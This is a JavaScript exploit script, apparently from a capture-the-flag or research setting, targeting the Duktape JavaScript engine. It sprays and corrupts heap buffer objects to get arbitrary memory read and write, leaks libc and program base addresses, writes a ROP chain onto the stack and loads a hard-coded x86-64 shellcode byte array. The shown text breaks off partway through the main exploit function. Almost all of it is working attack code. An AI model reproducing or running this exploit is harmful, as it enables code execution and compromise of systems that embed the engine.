/* UTILITIES */
function ArrayFrom(val) {
	r = Array();
	for(i = 0; i < val.length; i++) {
		r.push(val[i]);
	}
}
function ArrayFromRev(val) {
	r = Array();
	for(i = 0; i < val.length; i++) {
		r.push(val[i]);
	}
	return r.reverse();
}

function hexu(val) {
	return "0x" + val.toString(16);
}

function print_val(ptr, i) {
	console.log("val 0x" + ptr[i].toString(16));
}

function log(data) {
	console.log(data);
}

function success(data) {
	console.log("[+]" + data);
}

function fail(data) {
	console.log("[-]" + data);
}

function print_obj(iobj, joff) {
	console.log("===============================");
	console.log("obj ( 0) " + d2i(spray[iobj][joff]).toString());
	console.log("obj ( 1) " + d2i(spray[iobj][joff+1]).toString());
	console.log("obj ( 2) " + d2i(spray[iobj][joff+2]).toString());
	console.log("obj ( 3) " + d2i(spray[iobj][joff+3]).toString());
	console.log("obj ( 4) " + d2i(spray[iobj][joff+4]).toString());
	console.log("obj ( 5) " + d2i(spray[iobj][joff+5]).toString());
	console.log("obj ( 6) " + d2i(spray[iobj][joff+6]).toString());
	console.log("obj ( 7) " + d2i(spray[iobj][joff+7]).toString());
	console.log("obj ( 8) " + d2i(spray[iobj][joff+8]).toString());
	console.log("obj ( 9) " + d2i(spray[iobj][joff+9]).toString());
	console.log("obj (10) " + d2i(spray[iobj][joff+10]).toString());
	console.log("obj (11) " + d2i(spray[iobj][joff+11]).toString());
	console.log("obj (12) " + d2i(spray[iobj][joff+12]).toString());
	console.log("===============================");
}

// Return the hexadecimal representation of the given byte.
function hex(b) {
	return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
	var res = [];
	for (var i = 0; i < bytes.length; i++)
			res.push(hex(bytes[i]));

	return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
	if (hexstr.length % 2 == 1)
			throw new TypeError("Invalid hex string");

	var bytes = new Uint8Array(hexstr.length / 2);
	for (var i = 0; i < hexstr.length; i += 2)
			bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);
	return bytes;
}

var Struct = (function() {
	// Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
	var buffer      = new ArrayBuffer(8);
	var byteView    = new Uint8Array(buffer);
	var uint32View  = new Uint32Array(buffer);
	var float64View = new Float64Array(buffer);

	return {
			pack: function(type, value) {
					var view = type;        // See below
					view[0] = value;
					return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
			},

			unpack: function(type, bytes) {
					if (bytes.length !== type.BYTES_PER_ELEMENT)
							throw Error("Invalid bytearray");

					var view = type;        // See below
					byteView.set(bytes);
					return view[0];
			},

			// Available types.
			int8:    byteView,
			int32:   uint32View,
			float64: float64View
	};
})();/* SAELOS UINT64 FRAMEWORK */
function Int64(v) {
	// The underlying byte array.
	var bytes = new Uint8Array(8);

	switch (typeof v) {
			case 'number':
					v = '0x' + Math.floor(v).toString(16);
			case 'string':
					if (v.startsWith('0x'))
							v = v.substr(2);
					if (v.length % 2 == 1)
							v = '0' + v;

					var bigEndian = unhexlify(v, 8);
					bytes.set(ArrayFromRev(bigEndian));
					break;
			case 'object':
					if (v instanceof Int64) {
							bytes.set(v.bytes());
					} else {
							if (v.length != 8)
									throw TypeError("Array must have excactly 8 elements.");
							bytes.set(v);
					}
					break;
			case 'undefined':
					break;
			default:
					throw TypeError("Int64 constructor requires an argument.");
	}

	// Return a double whith the same underlying bit representation.
	this.asDouble = function() {
			// Check for NaN
			if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
					throw new RangeError("Integer can not be represented by a double");

			return Struct.unpack(Struct.float64, bytes);
	};

	// Return a javascript value with the same underlying bit representation.
	// This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
	// due to double conversion constraints.
	this.asJSValue = function() {
			if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
					throw new RangeError("Integer can not be represented by a JSValue");

			// For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
			this.assignSub(this, 0x1000000000000);
			var res = Struct.unpack(Struct.float64, bytes);
			this.assignAdd(this, 0x1000000000000);

			return res;
	};

	// Return the underlying bytes of this number as array.
	this.bytes = function() {
			return ArrayFrom(bytes);
	};

	// Return the byte at the given index.
	this.byteAt = function(i) {
			return bytes[i];
	};

	// Return the value of this number as unsigned hex string.
	this.toString = function() {
			return '0x' + hexlify(ArrayFromRev(bytes));
	};

	// Basic arithmetic.
	// These functions assign the result of the computation to their 'this' object.

	// Decorator for Int64 instance operations. Takes care
	// of converting arguments to Int64 instances if required.
	function operation(f, nargs) {
			return function() {
					if (arguments.length != nargs)
							throw Error("Not enough arguments for function " + f.name);
					for (var i = 0; i < arguments.length; i++)
							if (!(arguments[i] instanceof Int64))
									arguments[i] = new Int64(arguments[i]);
					return f.apply(this, arguments);
			};
	}

	// this = -n (two's complement)
	this.assignNeg = operation(function neg(n) {
			for (var i = 0; i < 8; i++)
					bytes[i] = ~n.byteAt(i);

			return this.assignAdd(this, Int64.One);
	}, 1);

	// this = a + b
	this.assignAdd = operation(function add(a, b) {
			var carry = 0;
			for (var i = 0; i < 8; i++) {
					var cur = a.byteAt(i) + b.byteAt(i) + carry;
					carry = cur > 0xff | 0;
					bytes[i] = cur;
			}
			return this;
	}, 2);

	// this = a - b
	this.assignSub = operation(function sub(a, b) {
			var carry = 0;
			for (var i = 0; i < 8; i++) {
					var cur = a.byteAt(i) - b.byteAt(i) - carry;
					carry = cur < 0 | 0;
					bytes[i] = cur;
			}
			return this;
	}, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
	var bytes = Struct.pack(Struct.float64, d);
	return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.
// Return -n (two's complement)
function Neg(n) {
	return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
	return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
	return (new Int64()).assignSub(a, b);
}

function d2i(val) {
	return new Int64.fromDouble(val);
}

function h2i(val) {
	return new Int64(val);
}

function h2d(val) {
  return h2i(val).asDouble();
}

function i2d(val) {
	return new Int64(val).asDouble();
}
/* PWN FUNCTION */
var spray = [];
var targets = [];
var pad = [];
var save = [];

var pwn = new function()
{
	/* exploit settings */
	this.debug_level = 3;	
	this.arch_ptr_size = 8;
	this.defrag_heap_rounds = 10;
	this.spray_rounds = 6;
	this.corrupt_len = 31337;
	this.next_walk = 1
	this.prev_walk = 2

	this.duk_hbufobj_magic = i2d(0x00000001e8002081);
	this.duk_hbufobj_u32_magic = i2d(0x000000001b0002081);
	this.duk_hbuffer_magic = i2d(0x0000000100000002); //0x000055902413cb70     02 00 00 00 01 00 00 00
	this.native_func_magic = i2d(0x0000000118075281); //0x000055902411fde0  81 52 07 18 01 00 00 00
	this.sc_ctx_buf_size = i2d(0x00269000000000); // 00 00 00 00 90 26 00 00
	this.sc_buf_size = i2d(0x000004d200000000); // 00 00 00 00 90 26 00 00
	this.compiled_func_magic = i2d(0x18040b81);
	this.corrupt_size = i2d(0x00007a6900000000);
	this.elf_marker = i2d(0x00010102464c457f); //0x00005625100af000     7f 45 4c 46 02 01 01 00     .ELF...........
	this.end_magic = i2d(0x0);
	this.native_func = undefined;
	/* env specific settings */
	this.hobj = undefined; /* hbufobj->fake_duk_hbuffer */
	this.hbuf_obj = undefined; /* fake duk_hbuffer */
	this.buf_offset = undefined;
	this.prev_ptr = undefined;
	this.next_ptr = undefined;
	this.hbuffer_ptr = undefined;
	this.shellcode_ctx = undefined;
	this.shellcode = undefined

	this.got_offset = 0x28dd70; 		/* got.free() */
	this.libc_offset = 0x97950; 		/* libc.free() */
	this.elf_offset = 0x27753;
	this.environ = 0x3ee098;
	this.stack_target = 0x8ed7;
	this.stack_target_2 = 0x7634c;
	this.rop = [0x100002155f,0x1000000,0x1000023e6a,0x1000,0x1000001b96,0x7,0x100003eb0b,0x22,0x100011b9d0,0x100002155f,0x1000000,0x1000023e6a,0xcaf3beef,0x1000001b96,0x494,0x10000bb460,0x1000001b96,0xac1dbeef,0x1000000,0xac1dbab3];
	this.scode = [0x48,0x89,0x15,0x53,0x03,0x00,0x00,0x48,0xc7,0xc3,0x11,0x00,0x00,0x00,0xe8,0x37,0x01,0x00,0x00,0x48,0xc7,0xc3,0x11,0x00,0x00,0x00,0xe8,0x2b,0x01,0x00,0x00,0x48,0xc7,0xc3,0x11,0x00,0x00,0x00,0xe8,0x1f,0x01,0x00,0x00,0x48,0xc7,0xc3,0x11,0x00,0x00,0x00,0xe8,0x13,0x01,0x00,0x00,0x48,0xc7,0xc3,0x01,0x00,0x00,0x00,0x48,0xc7,0xc1,0x20,0x00,0x00,0x00,0xe8,0x39,0x01,0x00,0x00,0x48,0xc7,0xc1,0x00,0x01,0x00,0x00,0x51,0x48,0xc7,0xc3,0x01,0x00,0x00,0x00,0xe8,0x7a,0x00,0x00,0x00,0x59,0x48,0xff,0xc9,0x48,0x83,0xf9,0x00,0x75,0xe9,0x48,0xc7,0xc3,0x07,0x00,0x00,0x00,0xe8,0x9d,0x00,0x00,0x00,0x48,0xc7,0xc3,0x02,0x00,0x00,0x00,0x48,0xc7,0xc1,0x11,0x00,0x00,0x00,0xe8,0xfc,0x00,0x00,0x00,0x48,0xc7,0xc3,0x03,0x00,0x00,0x00,0x48,0xc7,0xc1,0x11,0x00,0x00,0x00,0xe8,0xe9,0x00,0x00,0x00,0x48,0xc7,0xc3,0x04,0x00,0x00,0x00,0x48,0xc7,0xc1,0x11,0x00,0x00,0x00,0xe8,0xd6,0x00,0x00,0x00,0x48,0xc7,0xc3,0x03,0x00,0x00,0x00,0x48,0xc7,0xc1,0x11,0x00,0x00,0x00,0xe8,0x03,0x01,0x00,0x00,0x48,0xc7,0xc3,0x01,0x00,0x00,0x00,0x48,0xc7,0xc1,0x5a,0x00,0x00,0x00,0xe8,0x54,0x01,0x00,0x00,0xe8,0x05,0x02,0x00,0x00,0x48,0x8b,0x05,0xfb,0x02,0x00,0x00,0x48,0x89,0x05,0x84,0x02,0x00,0x00,0x48,0xc7,0xc0,0x01,0x00,0x00,0x00,0x48,0x8b,0x3d,0x1e,0x03,0x00,0x00,0x48,0x8d,0x35,0x67,0x02,0x00,0x00,0x48,0x8b,0x15,0x08,0x03,0x00,0x00,0x48,0x89,0x1d,0x81,0x02,0x00,0x00,0x0f,0x05,0xe8,0xfa,0x01,0x00,0x00,0xc3,0x48,0x8b,0x05,0xca,0x02,0x00,0x00,0x48,0x89,0x05,0x4b,0x02,0x00,0x00,0x48,0xc7,0xc0,0x01,0x00,0x00,0x00,0x48,0x8b,0x3d,0xe5,0x02,0x00,0x00,0x48,0x8d,0x35,0x2e,0x02,0x00,0x00,0x48,0x8b,0x15,0xcf,0x02,0x00,0x00,0x48,0x89,0x1d,0x48,0x02,0x00,0x00,0x0f,0x05,0xe8,0xc1,0x01,0x00,0x00,0xc3,0x48,0x8b,0x05,0x81,0x02,0x00,0x00,0x48,0x89,0x05,0x12,0x02,0x00,0x00,0x48,0xc7,0xc0,0x01,0x00,0x00,0x00,0x48,0x8b,0x3d,0xac,0x02,0x00,0x00,0x48,0x8d,0x35,0xf5,0x01,0x00,0x00,0x48,0x8b,0x15,0x96,0x02,0x00,0x00,0x48,0x89,0x1d,0x0f,0x02,0x00,0x00,0x0f,0x05,0xe8,0x88,0x01,0x00,0x00,0xc3,0x48,0x8b,0x05,0x60,0x02,0x00,0x00,0x48,0x89,0x05,0xd9,0x01,0x00,0x00,0x48,0xc7,0xc0,0x01,0x00,0x00,0x00,0x48,0x8b,0x3d,0x73,0x02,0x00,0x00,0x48,0x8d,0x35,0xbc,0x01,0x00,0x00,0x48,0x8b,0x15,0x5d,0x02,0x00,0x00,0x48,0x89,0x1d,0xd6,0x01,0x00,0x00,0x48,0x89,0x0d,0xd7,0x01,0x00,0x00,0x0f,0x05,0xe8,0x48,0x01,0x00,0x00,0xc3,0x48,0x8b,0x05,0x28,0x02,0x00,0x00,0x48,0x89,0x05,0x99,0x01,0x00,0x00,0x48,0xc7,0xc0,0x01,0x00,0x00,0x00,0x48,0x8b,0x3d,0x33,0x02,0x00,0x00,0x48,0x8d,0x35,0x7c,0x01,0x00,0x00,0x48,0x8b,0x15,0x1d,0x02,0x00,0x00,0x48,0x89,0x1d,0x96,0x01,0x00,0x00,0x51,0x0f,0x05,0xe8,0x0e,0x01,0x00,0x00,0x5a,0x48,0xc7,0xc0,0x01,0x00,0x00,0x00,0x48,0x8b,0x3d,0x07,0x02,0x00,0x00,0x48,0x8b,0x1d,0x48,0x01,0x00,0x00,0x48,0x8b,0x5b,0x08,0x48,0x89,0x1d,0x33,0x02,0x00,0x00,0x48,0x8d,0x35,0x2c,0x02,0x00,0x00,0x0f,0x05,0xc3,0x48,0x8b,0x05,0xc4,0x01,0x00,0x00,0x48,0x89,0x05,0x35,0x01,0x00,0x00,0x48,0xc7,0xc0,0x01,0x00,0x00,0x00,0x48,0x8b,0x3d,0xcf,0x01,0x00,0x00,0x48,0x8d,0x35,0x18,0x01,0x00,0x00,0x48,0x8b,0x15,0xb9,0x01,0x00,0x00,0x48,0x89,0x1d,0x32,0x01,0x00,0x00,0x51,0x0f,0x05,0xe8,0xaa,0x00,0x00,0x00,0x5a,0x48,0xc7,0xc0,0x01,0x00,0x00,0x00,0x48,0x8b,0x3d,0xa3,0x01,0x00,0x00,0x48,0x8b,0x1d,0xe4,0x00,0x00,0x00,0x48,0x8b,0x5b,0x10,0x48,0x89,0x1d,0xcf,0x01,0x00,0x00,0x48,0x8d,0x35,0xc8,0x01,0x00,0x00,0x0f,0x05,0xc3,0x48,0x8b,0x05,0x68,0x01,0x00,0x00,0x48,0x89,0x05,0xd1,0x00,0x00,0x00,0x48,0xc7,0xc0,0x01,0x00,0x00,0x00,0x48,0x8b,0x3d,0x6b,0x01,0x00,0x00,0x48,0x8d,0x35,0xb4,0x00,0x00,0x00,0x48,0x8b,0x15,0x55,0x01,0x00,0x00,0x48,0x89,0x1d,0xce,0x00,0x00,0x00,0x51,0x0f,0x05,0xe8,0x46,0x00,0x00,0x00,0x5a,0x48,0xc7,0xc0,0x00,0x00,0x00,0x00,0x48,0x8b,0x3d,0x3f,0x01,0x00,0x00,0x48,0x8d,0x35,0x76,0x01,0x00,0x00,0x0f,0x05,0xc3,0x48,0x8b,0x05,0x1e,0x01,0x00,0x00,0x48,0x89,0x05,0x7f,0x00,0x00,0x00,0x48,0xc7,0xc0,0x01,0x00,0x00,0x00,0x48,0x8b,0x3d,0x19,0x01,0x00,0x00,0x48,0x8d,0x35,0x62,0x00,0x00,0x00,0x48,0x8b,0x15,0x03,0x01,0x00,0x00,0x0f,0x05,0xc3,0x48,0xc7,0xc0,0x00,0x00,0x00,0x00,0x48,0x8b,0x3d,0xfa,0x00,0x00,0x00,0x48,0x8d,0x35,0x7b,0x00,0x00,0x00,0x48,0x8b,0x15,0xe4,0x00,0x00,0x00,0x0f,0x05,0x48,0x8b,0x05,0x8b,0x00,0x00,0x00,0x48,0x83,0xf8,0x00,0x74,0xd5,0xc3,0x48,0xc7,0xc0,0x01,0x00,0x00,0x00,0x48,0x8b,0x3d,0xd6,0x00,0x00,0x00,0x48,0x8b,0x35,0xd7,0x00,0x00,0x00,0x48,0xc7,0xc2,0x0a,0x00,0x00,0x00,0x0f,0x05,0xc3,0x48,0x89,0xc0,0xeb,0xfb,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x49,0x52,0x43,0x5f,0x49,0x50,0x43,0x00,0x03,0x00,0x1d,0xac,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x49,0x52,0x43,0x5f,0x49,0x50,0x43,0x00,0x03,0x00,0x1d,0xac,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x1d,0xac,0x00,0x00,0x00,0x00,0x04,0x00,0x1d,0xac,0x00,0x00,0x00,0x00,0x05,0x00,0x1d,0xac,0x00,0x00,0x00,0x00,0x06,0x00,0x1d,0xac,0x00,0x00,0x00,0x00,0x07,0x00,0x1d,0xac,0x00,0x00,0x00,0x00,0x08,0x00,0x1d,0xac,0x00,0x00,0x00,0x00,0x01,0x00,0x1d,0xac,0x00,0x00,0x00,0x00,0x38,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x6f,0x6b,0x6f,0x6b,0x6f,0x6b,0x6f,0x6b,0x0a,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00];
	this.scode_len = 1172;
	this.stack_offset = 0x2f0;
	this.god_gadget = 0x4f322;
	this.rop_chain = [];

	this.stack = undefined;
	this.stack2 = undefined;
	this.libc = undefined;
	this.elf = undefined;
	this.native_func_offset = 0x38;

	this.set_ctx = function() {
		log("[+] pwn context initialized - macht mit musik!");
		/* create fake duk_hbuffer object */
		//log(Duktape.info(this.hobj));
		//this.hbuf_obj[this.buf_offset+1] = i2d(0x0); /* null linked list */
		//this.hbuf_obj[this.buf_offset+2] = i2d(0x0); /* null linked list */
		this.hbuf_obj[this.buf_offset+4] = i2d(0xdeadbeef); /* target_addr */
		this.hbuf_obj[this.buf_offset+5] = i2d(0x0); /* null linked list */
		this.hbuf_obj[this.buf_offset] = i2d(0x0000222200000081); /* set magic to 81 (dynamic/external) and refcount to 2 */

	};

	this.reset_ctx = function() {
		/* create fake duk_hbuffer object */

		this.hbuf_obj[this.buf_offset+4] = i2d(0x0); /* target_addr */
		this.hbuf_obj[this.buf_offset+5] = i2d(0x0); /* null linked list */
		this.hbuf_obj[this.buf_offset] = i2d(0x0); /* set magic to 81 (dynamic/external) and refcount to 2 */
		Duktape.gc();
		//this.hbuf_obj[this.buf_offset+1] = i2d(0x0); /* null linked list */
		//this.hbuf_obj[this.buf_offset+2] = i2d(0x0); /* null linked list */
		this.hbuf_obj[this.buf_offset+4] = i2d(0xdeadbeef); /* target_addr */
		this.hbuf_obj[this.buf_offset+5] = i2d(0x0); /* null linked list */
		this.hbuf_obj[this.buf_offset] = i2d(0x0000222200000081); /* set magic to 81 (dynamic/external) and refcount to 2 */
	};

	this.set_addri = function(addr) {
		this.hbuf_obj[this.buf_offset+4] = addr.asDouble(); /* target_addr */
	}

	this.set_addr = function(addr) {
		this.hbuf_obj[this.buf_offset+4] = i2d(0xdeadbeef); /* target_addr */
	}	

	this.set_addr_raw = function(addr) {
		this.hbuf_obj[this.buf_offset+4] = addr; /* target_addr */
	}	

	this.read64_idx = function(idx) {
		return this.hobj[idx];
	}	

	this.write64_idx = function(idx, val) {
		this.hobj[idx] = i2d(val);
	}	

	this.read64i = function(addr) {
		this.hbuf_obj[this.buf_offset+4] = addr.asDouble();
		return d2i(this.hobj[0]);
	};

	this.read64 = function(addr) {
		this.hbuf_obj[this.buf_offset+4] = i2d(addr);
		return d2i(this.hobj[0]);
	};

	this.write64i = function(addr, val) {
		this.hbuf_obj[this.buf_offset+4] = addr.asDouble();
		this.hobj[0] = i2d(val);
	};

	this.write64d = function(addr, val) {
		this.hbuf_obj[this.buf_offset+4] = addr.asDouble();
		this.hobj[0] = val.asDouble();
	};

	this.write64 = function(addr, val) {
		this.hbuf_obj[this.buf_offset+4] = addr;
		this.hobj[0] = val;
	};

	this.find_elf = function(addr) {
		addr = d2i(addr);
		addr.assignSub(addr, this.elf_offset);
		res = this.read64i(addr);
		if(res.asDouble() == this.elf_marker)
		{
			console.log("[+] Found ELF base at: " + addr);
			return addr;
		}
		return 0;
	};
	
	this.leak_libc = function(addr) {
		addr = this.find_native_func(addr);
		if(addr)
			elf_base = this.find_elf(addr);
		if(elf_base)
		{
			this.elf = d2i(elf_base.asDouble());
			elf_base.assignAdd(elf_base, this.got_offset);
			this.libc = this.read64i(elf_base) 
			this.libc.assignSub(this.libc, this.libc_offset);
			log("[+] Found libc base: " + this.libc);
			this.rebase();
			return this.libc;
		}
		return 0;
	};

	this.rebase = function() {
		/* rebase target pointers with libc-base */
		this.environ = h2i(this.environ);
		this.god_gadget = h2i(this.god_gadget)
		this.environ.assignAdd(this.environ, this.libc);
		this.god_gadget.assignAdd(this.god_gadget, this.libc);

		this.stack_target = h2i(this.stack_target);
		this.stack_target.assignAdd(this.stack_target, this.elf);
		this.stack_target_2 = h2i(this.stack_target_2);
		this.stack_target_2.assignAdd(this.stack_target_2, this.elf);
		log("[+] Environ addr: " + this.environ);
		log("[+] Stack-target addr: " + this.stack_target);
		log("[+] Stack-target 2 addr: " + this.stack_target_2);
		log("[+] God-gadget addr: " + this.god_gadget);
		return 0;
	};

	this.leak_stack = function() {
		this.stack = this.read64i(this.environ);
		// get another
		this.stack2 = this.read64i(this.environ);
		this.stack2.assignSub(this.stack2, this.stack_offset);
		log("[+] Stack-MAIN-target: " + this.stack2);
		log("[+] Stack base-addr: " + this.stack);
	}

	this.setup_shellcode = function() {
		this.sc_ctx = new Float64Array(1234);
		this.sc = new Uint8Array(1234);

		var sc_ctx_ptr = d2i(this.find_buf(this.next_ptr, this.duk_hbufobj_magic, this.sc_ctx_buf_size, this.next_walk));
		if(sc_ctx_ptr.asDouble() == 0) {
			log("[*] Looking in back buf")
			sc_ctx_ptr = d2i(this.find_buf(this.prev_ptr, this.duk_hbufobj_magic, this.sc_ctx_buf_size, this.prev_walk));
		}
		var sc_ptr = d2i(this.find_buf(this.next_ptr, this.duk_hbufobj_u32_magic, this.sc_buf_size, this.next_walk));
		if(sc_ptr.asDouble() == 0) {
			log("[*] Looking in back buf")
			sc_ptr = d2i(this.find_buf(this.prev_ptr, this.duk_hbufobj_u32_magic, this.sc_buf_size, this.prev_walk));
		}

		log("[+] Shellcode buffer: " + sc_ctx_ptr);
		log("[+] Shellcode buffer: " + sc_ptr);
		this.shellcode_ctx = Add(sc_ctx_ptr, 0x20);
		this.shellcode = Add(sc_ptr, 0x20);
		log("[*] Shellcode ctx: " + this.shellcode_ctx);
		log("[*] Shellcode: " + this.shellcode);

		target =  this.stack_target_2.asDouble();
		/* setup shellcode context*/
		this.sc_ctx[0] = this.shellcode_ctx.asDouble();
		this.sc_ctx[1] = this.stack2.asDouble();
		this.sc_ctx[2] = this.god_gadget.asDouble();
		/* setup shellcode */

		for(wyff = 0; wyff < this.scode_len; wyff++) {
			this.sc[wyff] = this.scode[wyff];
		}
	}

	this.setup_rop = function() {
		/* rebase ROP pointers with libc-base */
		for(yaff = 0; yaff < this.rop.length; yaff++) {
			if(this.rop[yaff] == 0xcaf3beef) {
				this.rop_chain.push(this.shellcode);
				continue;
			}
			if(this.rop[yaff] == 0xac1dbeef) {
				this.rop_chain.push(this.shellcode_ctx);
				continue;
			}
			if(this.rop[yaff] - 0x1000000000 > 0) {
				var g = h2i(this.rop[yaff]);
				g.assignSub(g, 0x1000000000);
				g.assignAdd(g, this.libc);
				this.rop_chain.push(g);
			} else {
				this.rop_chain.push(h2i(this.rop[yaff]));
			}
		}

		target =  this.stack_target.asDouble();
		for(ayy = 0; ayy < 0x1000; ayy++) {
			this.set_addri(this.stack);
			if(this.hobj[0] == target) {
				log("[+] Found stack-hijack at: " + this.stack);
				log("[*] Writing ROP-chain to stack!");
				for(fooz = 0; fooz < this.rop_chain.length; fooz++)
				{
					this.write64d(this.stack, this.rop_chain[fooz]);
					this.stack.assignAdd(this.stack, 8);
				}
				return 0;
			}
			this.stack.assignSub(this.stack, 8);
		}
		log("Failed to find stack-hijack!");
		return 0;
	};

	this.to_arch_size = function(val) {
		var arch_ptr = 8;
		return val / arch_ptr;
	}

	/* find duk_hnatfunc */
	this.find_native_func = function(addr) {
		log("[*] Looking for native duktape function ...");
		addr = this.walk(addr, this.native_func_magic, 1, 0);
		this.native_func = addr;
		this.set_addr_raw(addr);
		addr = this.read64_idx(this.to_arch_size(this.native_func_offset)); /* +0x38 - duk_hnatfunc->func */
		if(pwn.debug_level >= 3)
			log("[+] Leaked native func: " + d2i(addr));
		return addr;
	};

	this.call = function() {
		log("[+] OK gogo!");
		performance.now();		
	}

	this.set_rip = function(addr, val) {
		log("[*] Setting RIP to: " + hexu(val));
		this.set_addr_raw(addr);
		this.write64_idx(this.to_arch_size(this.native_func_offset), val); /* +0x38 - duk_hnatfunc->func */	
	}

	this.find_val = function(arr, needle) {
		for(i = 0; i < arr.length; i++)
		{
			if(arr[i] == needle)
				return true;
		}
		return false;
	};

	/* walk the duk_heaphdr linked list */
	this.walk = function(addr, needle, direction, next) 
	{
		orig =  addr.asDouble();
		curr = undefined;
		this.set_addri(addr);

		if(direction == this.next_walk)
			log("[*] Walking duk_heaphdr->next linked-list");
		else
			log("[*] Walking duk_heaphdr->prev linked-list");
		if(next) {
			this.set_addri(d2i(this.hobj[direction]));
		}

		do 
		{
			if(this.debug_level >= 4) {
				log("flags " + d2i(this.hobj[0]));
				log("duk_heaphdr->direction " + d2i(curr));
			}
			if(this.hobj[0] == needle) {
				if(this.debug_level >= 2)
					log("[+] Found needle: " + d2i(curr));
				return curr;
			}
			curr = this.hobj[direction];
			this.set_addr_raw(this.hobj[direction]);
		} while(this.hobj[direction] != pwn.end_magic && this.hobj[direction] != orig);
		log("[*] Walk completed ...");
		return 0;
	};

	this.find_buf = function(addr, needle, size, direction) 
	{
		orig =  addr.asDouble();
		curr = undefined;
		this.set_addri(addr);

		if(direction == this.prev_walk)
			log("[*] Walking duk_heaphdr->next linked-list");
		else
			log("[*] Walking duk_heaphdr->prev linked-list");

		do 
		{
			if(this.debug_level >= 4) {
				log("flags " + d2i(this.hobj[0]));
				log("duk_heaphdr->direction " + d2i(curr));
			}

			if(this.hobj[0] == needle) {
				if(this.debug_level >= 4) {
				log("[+] Found needle: " + d2i(curr));
				log("[+] Found size: " + d2i(this.hobj[9]));
				log("[+] Found buf: " + d2i(this.hobj[7]));
				}
				if(this.hobj[9] == size) {
					log("[+] Found needle: " + d2i(curr));
					return this.hobj[7];
				}
			}
			curr = this.hobj[direction];
			this.set_addr_raw(this.hobj[direction]);
		} while(this.hobj[direction] != pwn.end_magic && this.hobj[direction] != orig);
		log("[*] Walk completed ...");
		return 0;
	};
}

/* EXPLOITATION */
function exploit() {
	var hobj_idx = undefined;
	var hobj_offset = undefined;
	var hbuffer_offset = undefined;
	var found = 0;

	/* defrag the heap */
	for(i = 0; i < pwn.defrag_heap_rounds; i++) {
		f = new Float64Array(4);f[0] = 1111.4444;f[1] = 2222.5555;
		pad.push(f);
	}

	/* spray duk_hbufobj and duk_hbuffer objects via Float64Arrays*/
	for(i = 0; i < pwn.spray_rounds; i++) {
		var p = new Float64Array(4);p[0]=1337.0;p[1]=4445.0;
		p.sect(); /* trigger vuln */
		spray.push(p);
		var q = new Float64Array(200);q[0]=6661.6661;q[1]=1116.1116;
		targets.push(q);
	}
	
	/* find sprayed duk_hbufobj in the heap */
	for (i = 0; i < pwn.spray_rounds; i++) 
	{
		for(j = 0; j < pwn.corrupt_len; j++) 
		{
			if(spray[i][j] == pwn.duk_hbufobj_magic && spray[i][j+9] == pwn.corrupt_size)
			{
				hobj_idx = i;
				hobj_offset = j;
				found = 1;
				break;
			}
		}
		if(found)
			break;
	}

	if(!found){
		log("[-] Exploit failed ...");
		return;
	}

	/* save duk_hbufobj values */
	pwn.next_ptr = d2i(spray[hobj_idx][hobj_offset+1]);
	pwn.prev_ptr = d2i(spray[hobj_idx][hobj_offset+2]);
	pwn.hbuffer_ptr = d2i(spray[hobj_idx][hobj_offset+7]);
	if(pwn.debug_level >= 2) {
		log("[*] hbufojb->next: " + pwn.next_ptr.toString());
		log("[*] hbufojb->prev: " + pwn.prev_ptr.toString());
		log("[*] hbufojb->hbuffer: " + pwn.hbuffer_ptr.toString());
	}

	/* find duk_hbuffer in memory */
	for (i = 0; i < pwn.corrupt_len; i++) {	
		if(spray[hobj_idx][i] == pwn.duk_hbuffer_magic && 
			spray[hobj_idx][i+4] == 6661.6661 && 
			spray[hobj_idx][i+5] == 1116.1116) {
			hbuffer_offset = i;
			hbuffer_data_offset = i + 4;
			break;
		}
	}

	/* find duk_hbufobj pointing to our duk_hbuffer in memory  */
	spray[hobj_idx][hbuffer_offset+4] = 1337.7331;
	for(i = 0; i < pwn.spray_rounds; i++) {
		if(targets[i][0] == 1337.7331) {
			pwn.hobj = targets[i];
